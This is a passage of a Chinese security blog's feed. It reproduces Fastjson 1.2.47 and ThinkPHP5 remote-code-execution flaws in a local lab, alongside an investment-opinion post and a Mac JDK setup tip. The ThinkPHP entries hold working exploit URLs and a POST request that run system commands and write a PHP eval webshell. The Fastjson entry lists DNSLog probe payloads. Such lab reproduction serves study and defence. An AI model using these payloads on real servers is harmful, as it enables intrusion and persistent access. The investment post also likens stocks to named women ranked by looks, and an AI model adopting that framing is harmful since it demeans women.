      &lt;p&gt;本文主要复现Fastjson 1.2.47 远程命令执行漏洞&lt;/p&gt;&lt;h3 id=&quot;判断是否使用fastjson&quot;&gt;&lt;a href=&quot;#判断是否使用fastjson&quot; class=&quot;headerlink&quot; title=&quot;判断是否使用fastjson&quot;&gt;&lt;/a&gt;判断是否使用fastjson&lt;/h3&gt;&lt;p&gt;启动环境，可以根据logo图标判断是否使用了fastjson&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png&quot; alt=&quot;image-20201013165844484&quot;&gt;&lt;/p&gt;&lt;p&gt;转换为post方式提交，查看放回包也可以判断是否使用了fastjson&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015140321953.png&quot; alt=&quot;image-20201015140321953&quot;&gt;&lt;/p&gt;&lt;p&gt;DNSLog判断&lt;/p&gt;&lt;p&gt;判断payload&lt;/p&gt;&lt;figure class=&quot;highlight perl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.Inet4Address&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.Inet6Address&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.InetSocketAddress&quot;&lt;/span&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;address&quot;&lt;/span&gt;:, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;com.alibaba.fastjson.JSONObject&quot;&lt;/span&gt;, &amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;&amp;#125;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;:&lt;span class=&quot;string&quot;&gt;&quot;aaa&quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Set[&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Set[&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;dnslog&quot;&lt;/span&gt;&amp;#125;:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://choge.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Fastjson" scheme="https://choge.top/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5远程代码执行漏洞复现</title>
    <link href="https://choge.top/2020/10/12/Thinkphp5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/</id>
    <published>2020-10-12T06:13:35.000Z</published>
    <updated>2020-10-28T01:23:01.245Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要复现Thinkphp5远程代码执行漏洞</p><h3 id="Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability"><a href="#Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability" class="headerlink" title="Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability"></a>Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability</h3><p>启动Thinkphp5环境，可以通过页面多处特征判断是否采用了Thinkphp5框架</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012143945259.png" alt="image-20201012143945259"></p><p>payload判断是否存在远程代码执行漏洞</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=-1%20and%20it%27ll%20execute%20the%20phpinfo</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012144135699.png" alt="image-20201012144135699"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012144355244.png" alt="image-20201012144355244"></p><p>写入shell</p><p>Windows环境</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br></pre></td></tr></table></figure><p>Linux环境</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20%27%3C?php%20@eval($_GET[%22code%22])?%3E%27%3Eshell.php</span><br></pre></td></tr></table></figure><p>使用如下方式对Linux环境进行写入shell</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=file<span class="emphasis">_put_</span>contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C?php%20@eval($<span class="emphasis">_GET[%22code%22])?%3Ei</span></span><br></pre></td></tr></table></figure><p>查看写入成功</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012151125914.png" alt="image-20201012151125914"></p><p>访问如下，写入成功</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012151400117.png" alt="image-20201012151400117"></p><p>注意有时候需要加入/public目录进行测试</p><p><a href="http://localhost:9096/public/index.php?s=" target="_blank" rel="noopener">http://localhost:9096/public/index.php?s=</a></p><h3 id="ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability"><a href="#ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability" class="headerlink" title="ThinkPHP5 5.0.23 Remote Code Execution Vulnerability"></a>ThinkPHP5 5.0.23 Remote Code Execution Vulnerability</h3><p>ThinkPHP5 5.0.23直接通过post形式可以实现远程命令执行，如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012155854569.png" alt="image-20201012155854569"></p><p>写入shell</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201028092150996.png" alt="image-20201028092150996"></p><p>连接成功</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201028092243638.png" alt="image-20201028092243638"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_36711453/article/details/84977739" target="_blank" rel="noopener">https://blog.csdn.net/qq_36711453/article/details/84977739</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要复现Thinkphp5远程代码执行漏洞&lt;/p&gt;&lt;h3 id=&quot;Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability&quot;&gt;&lt;a href=&quot;#Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability&quot; class=&quot;headerlink&quot; title=&quot;Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability&quot;&gt;&lt;/a&gt;Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability&lt;/h3&gt;&lt;p&gt;启动Thinkphp5环境，可以通过页面多处特征判断是否采用了Thinkphp5框架&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012143945259.png&quot; alt=&quot;image-20201012143945259&quot;&gt;&lt;/p&gt;&lt;p&gt;payload判断是否存在远程代码执行漏洞&lt;/p&gt;&lt;figure class=&quot;highlight markdown&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://127.0.0.1:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call&lt;span class=&quot;emphasis&quot;&gt;_user_&lt;/span&gt;func_array&amp;amp;vars[&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt;]=phpinfo&amp;amp;vars[&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt;][&lt;span class=&quot;symbol&quot;&gt;&lt;/span&gt;]=-1%20and%20it%27ll%20execute%20the%20phpinfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://choge.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Thinkphp5" scheme="https://choge.top/tags/Thinkphp5/"/>
    
  </entry>
  
  <entry>
    <title>跟叔投资逻辑总结（雪球部分）草稿，不断更新中</title>
    <link href="https://choge.top/2020/10/10/%E8%B7%9F%E5%8F%94%E6%8A%95%E8%B5%84%E9%80%BB%E8%BE%91%E6%80%BB%E7%BB%93%EF%BC%88%E9%9B%AA%E7%90%83%E9%83%A8%E5%88%86%EF%BC%89/"/>
    <id>https://choge.top/2020/10/10/跟叔投资逻辑总结（雪球部分）/</id>
    <published>2020-10-10T01:18:14.000Z</published>
    <updated>2021-01-31T07:22:26.393Z</updated>
    
    <content type="html"><![CDATA[<h2 id="跟叔投资逻辑总结"><a href="#跟叔投资逻辑总结" class="headerlink" title="跟叔投资逻辑总结"></a>跟叔投资逻辑总结</h2><h3 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h3><p>2015年牛市中坚持乐视网，因为贾跃亭减持，不是不看好，而是牛市中时间宝贵</p><h3 id="股市和女人关系"><a href="#股市和女人关系" class="headerlink" title="股市和女人关系"></a>股市和女人关系</h3><p>这里我来八一八创业板和女人的关系，<br> 创业板分 4 类。 第一类:既有业绩，又有故事。优秀的代表，乐视网，碧生源。 第二类:光有业绩，没有故事。优秀代表，网宿科技，大富科技。 第三类:没有业绩，光有故事。优秀代表，千山药机。 第四类:即无业绩，也无故事。优秀代表，湘鄂情，星辉车模。 对应的 4 中女人。 1:即有脸蛋，又有智慧。优秀代表，奶茶妹妹。 2:光有脸蛋，没有智慧。优秀代表，天仙妹妹。 3:没有脸蛋，光有智慧。优秀代表，邓文迪。 4:即无脸蛋，又无智慧。优秀代表，凤姐。不是凤爪</p><a id="more"></a><p>从财富估值的角度来说，第一类股票和女人估值最高，乐视，碧生源，奶茶(背后的资产刘 强东)。这样的高估值会一直存在。大家想想看，乐视业绩一直不错，故事又非常多，而且 每一个故事都很成功。奶茶亦然，人长得漂亮，又保送清华，交换生哥大。是刚才例子里估值最高的女人。且是市场反复炒作的对象(乐视网上市 4 年，年年被市场反复炒作，碧生源亦然。奶茶也是媒体反复炒作的对象。</p><p>第二类股票和女人只能享受比较一般的的估值。网速科技，大富科技按照创业板平均估值来 看，他们 40 倍不到，显然估值偏低。他们由于纯靠业绩，几乎没有什么故事，所以一旦业 绩不行了。哈哈，就会如天仙妹妹一样从人们的视线中消失。当年的中兴通讯，中集集团无不是此类。</p><p>第三类股票和女人在被炒作某一阶段，享受的估值高的离谱，如千山药机，就像邓文迪一样。 且只要有故事，会被反复炒作。所以邓文迪也被媒体炒作多年，一直到千山没有故事啦，庄 家撤里，千山就没有任何价值啦。邓文迪被默克多这个庄家撤离后，显然，媒体关注度大降。</p><p>第四类股票和女人，股票靠收购或重组，女人靠整容，否则无法享受高估值。显然湘鄂情改 名中科云网后遭到爆炒，柳岩和就是改名后的中科云网，而悲惨的凤姐由于本身质地太差，整容重组有难度，现在还享受着没有改名以前湘鄂情的估值。创业板如女人，炒中国股市只能炒创业板，物以稀为贵。最后链接一篇我已经的文章关于创</p><p>业板的 <a href="http://xueqiu.com/8255849716/30330728" target="_blank" rel="noopener">http://xueqiu.com/8255849716/30330728</a></p><h3 id="中美两国的不同国情下不同的估值体系"><a href="#中美两国的不同国情下不同的估值体系" class="headerlink" title="中美两国的不同国情下不同的估值体系"></a>中美两国的不同国情下不同的估值体系</h3><p>成长 20%算是超级成长股吗。在美国是，在中国不是，因为美国的 gdp 的增长一年才 2% 左右。中国 10%左右。再加上中国的通货膨胀太吓人啦，所以中国的超级成长股至少一年50%以上增长才有效。</p><p>巴菲特买入的可口可乐在市值已经很大的情况下又赚了几十倍，这个情况在中国也不适用。 目前来看中国诞生可口可乐这样的消费股是完全没有任何可能。全世界都崇拜美国，在美国 的文化影响下，可口可乐的市场是全世界。任何一个美国消费股的市场都是全世界，如星巴克，麦当劳，高露洁等等。伊利，王老吉，茅台，云南白药的市场只有中国。只有一国的文化足够强大到影响全世界时，他的产品才会被全世界消费者认可。如最近几年的韩国文化对全世界的影响，才让三星这么垃圾的手机在全世界的销量超过苹果。</p><h3 id="辉煌的-2010"><a href="#辉煌的-2010" class="headerlink" title="辉煌的 2010"></a>辉煌的 2010</h3><p>后来总结出规律，只要是主营业务是往 官员嘴里送的股票都是牛股，如茅台，五粮液，泸州老窖，獐子岛(因为这些东西越涨价越 能体现官员和贱民的身份差距)，所以胡温时代的奢侈消费品股票是不可多得的好标的。接 下来 7 月上市的一个主营业务海参苗的公司壹桥苗业，就是我的攻击目标啦。买的不多 20多万但是短短一个半月盈利了 35 万。怎么也没想到庄家那么疯狂。</p><p>我喜欢在历史的牛股里寻找未来牛股的影子，无意中又发现东方园林上市以后半年涨了 4 倍。而且发现它的业绩一直很好，增长稳定且年年 100%的超超级成长股。后来专门找了一 个市政公用局的一个处长了解了一下 ，拿园林合同不难，每年各个城市的园林绿化投入都 很大，做园林的技术含量也不高，公司非常多，但是中标以后，必须垫资进场。他说比如说 10 个亿的标大概要垫 3 个亿才能开工。天哪，园林上市以后圈了 10 几亿，自然有钱垫资啦， 棕榈园林上市之前，每年的合同才几个亿。难怪园林上市公司当年及第二年业绩都非常好。 到了第三年都要增发，因为第三年又没钱垫啦。ok。棕榈园林，就是他啦。这个票受了点折磨，原来只打算买 20 万的，后来回调后补了 20 万，翻翻后走人。3 个月赚了 45 万。没有请那个处长吃饭，我是绝对不敢在底位补仓的。</p><p>我在年初跳槽到了一家做 sp 的中小公司，当江苏的老大，6 月份我的一个助理遭遇恋爱婚 姻危机，一天我加完班，他请我吃饭说到下半年国庆节结婚的烦恼，说现在的女友看中通灵 翠钻的一款翡翠玉镯，和几年前的一个女友看中的是一模一样，一个货号，当时买给前女友 时大概 7000 多一对，4 年前的事，现在居然要 5 万多，涨了 7 倍啊。饭后回家，我又百度 了玉的情况，发现 2000 年到 2010 年玉居然涨了 50 多倍。百度了一下，发现主营玉的上 市公司居然有，是东方金钰，居然还没怎么涨 ，第二天，我问我的助理，你还有多少钱准 备结婚，他说接近 30 万，你炒股吗，他不炒，我让他开个账户，买入东方金钰。在 10 月 份之前，这个 30 万能够挣到 6 万不就有买玉镯的钱了吗。当然，这种票我没买。因为当时 持有莱宝高科。壹桥苗业。科大讯飞，棕榈园林。后来从我推荐的位臵涨了 200%，他也没买，有点遗憾。</p><h3 id="投资理念"><a href="#投资理念" class="headerlink" title="投资理念"></a>投资理念</h3><p>买股票一看未来，二用逻辑进行推理</p><h3 id="影响最大的书"><a href="#影响最大的书" class="headerlink" title="影响最大的书"></a>影响最大的书</h3><p>1.马克思的政治经济学。里面的关于供求关系的论述是我领悟最深的。这也是我重来不碰银</p><p>行股的原因。</p><p>2.纳什的博弈论，及所有博弈论相关的书籍。</p><p>宏观上从中体会到股市和经济的博弈，股市和国家资金政策的博弈。次宏观上体会股市里的主板和中小板，创业板的博弈，蓝筹和概念的博弈，庄家和散户的博弈。微观上体会个股自己股价和业绩的博弈，股价和题材故事的博弈。</p><p>3.马克思主义哲学，学习他的螺旋式上升，否定之否定。从中体会坚定持股的信心。</p><p>4.大数据，让我彻底从一个移动互联网盲变成一个可以在 it 人面前侃侃而谈。从中挖掘很多大牛股。</p><p>5.比尔盖次的，未来之路。体会他对未来科技精准的预判。提供了我喜欢瞎想的优秀炒股品格。</p><p>6.可以说唯一和大师有关对我炒股有影响的书就是彼得林奇的如何寻找超级成长股。但仅仅从 中领悟了一定要做成长股。至于书中的内容，大部分都没有借鉴价值。因为时代不同啦。他那个时代的什么连锁酒店之类的大牛股和现在移动互联网科技时代比，简直弱爆了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;跟叔投资逻辑总结&quot;&gt;&lt;a href=&quot;#跟叔投资逻辑总结&quot; class=&quot;headerlink&quot; title=&quot;跟叔投资逻辑总结&quot;&gt;&lt;/a&gt;跟叔投资逻辑总结&lt;/h2&gt;&lt;h3 id=&quot;坚持&quot;&gt;&lt;a href=&quot;#坚持&quot; class=&quot;headerlink&quot; title=&quot;坚持&quot;&gt;&lt;/a&gt;坚持&lt;/h3&gt;&lt;p&gt;2015年牛市中坚持乐视网，因为贾跃亭减持，不是不看好，而是牛市中时间宝贵&lt;/p&gt;&lt;h3 id=&quot;股市和女人关系&quot;&gt;&lt;a href=&quot;#股市和女人关系&quot; class=&quot;headerlink&quot; title=&quot;股市和女人关系&quot;&gt;&lt;/a&gt;股市和女人关系&lt;/h3&gt;&lt;p&gt;这里我来八一八创业板和女人的关系，&lt;br&gt; 创业板分 4 类。 第一类:既有业绩，又有故事。优秀的代表，乐视网，碧生源。 第二类:光有业绩，没有故事。优秀代表，网宿科技，大富科技。 第三类:没有业绩，光有故事。优秀代表，千山药机。 第四类:即无业绩，也无故事。优秀代表，湘鄂情，星辉车模。 对应的 4 中女人。 1:即有脸蛋，又有智慧。优秀代表，奶茶妹妹。 2:光有脸蛋，没有智慧。优秀代表，天仙妹妹。 3:没有脸蛋，光有智慧。优秀代表，邓文迪。 4:即无脸蛋，又无智慧。优秀代表，凤姐。不是凤爪&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Mac安装JDK双版本</title>
    <link href="https://choge.top/2020/10/09/Mac%E5%AE%89%E8%A3%85JDK%E5%8F%8C%E7%89%88%E6%9C%AC/"/>
    <id>https://choge.top/2020/10/09/Mac安装JDK双版本/</id>
    <published>2020-10-09T08:40:58.000Z</published>
    <updated>2020-10-09T08:47:41.984Z</updated>
    
    <content type="html"><![CDATA[<p>cd /Library/Java/JavaVirtualMachines/</p><p><img src="//choge.top/2020/10/09/Mac安装JDK双版本/image-20201009164159130.png" alt="image-20201009164159130"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~/.bash_profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加下面的代码</span></span><br><span class="line"><span class="comment">#JDK切换</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_8_HOME</span>=/Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_13_HOME</span>=/Library/Java/JavaVirtualMachines/jdk-13.jdk/Contents/Home</span><br><span class="line">alias <span class="attribute">jdk8</span>=<span class="string">'export JAVA_HOME=$JAVA_8_HOME'</span></span><br><span class="line">alias <span class="attribute">jdk13</span>=<span class="string">'export JAVA_HOME=$JAVA_13_HOME'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存退出</span></span><br><span class="line"><span class="comment">#激活环境变量</span></span><br><span class="line">$ source ~/.bash_profile</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="//choge.top/2020/10/09/Mac安装JDK双版本/image-20201009164728569.png" alt="image-20201009164728569"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;cd /Library/Java/JavaVirtualMachines/&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/09/Mac安装JDK双版本/image-20201009164159130.png&quot; alt=&quot;image-20201009164159130&quot;&gt;&lt;/p&gt;&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ vim ~/.bash_profile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#添加下面的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#JDK切换	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;JAVA_8_HOME&lt;/span&gt;=/Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;JAVA_13_HOME&lt;/span&gt;=/Library/Java/JavaVirtualMachines/jdk-13.jdk/Contents/Home&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alias &lt;span class=&quot;attribute&quot;&gt;jdk8&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;export JAVA_HOME=$JAVA_8_HOME&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alias &lt;span 